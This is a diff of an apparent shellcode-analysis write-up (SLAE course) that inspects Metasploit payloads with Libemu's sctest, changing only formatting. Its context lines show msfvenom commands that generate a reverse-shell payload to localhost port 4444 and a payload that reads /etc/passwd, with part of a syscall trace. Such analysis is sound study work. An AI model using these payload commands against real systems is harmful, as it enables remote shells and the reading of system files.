@@ -244,7 +244,7 @@ The Sctest tool, part of the Libemu test suite, is used to inspect the program c
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | sctest -vvv -Ss 42
-<-- SNIPPET -->
+
 int socket (
      int domain = 2;
      int type = 1;
@@ -302,7 +302,7 @@ The required syscalls are shown:
 #### 3rd Shellcode (linux/x86/read_file)
 --------------
 
-The Read File payload reads a chosen file as specified, requiring 2 arguments, the file descriptor to write the output to (standard output), and the path to the file:
+The Read File payload reads a chosen file as specified, requiring 2 arguments, the file descriptor to write the output to (standard output), and the <code class="language-plaintext highlighter-rouge">PATH</code> to the file:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux -f c
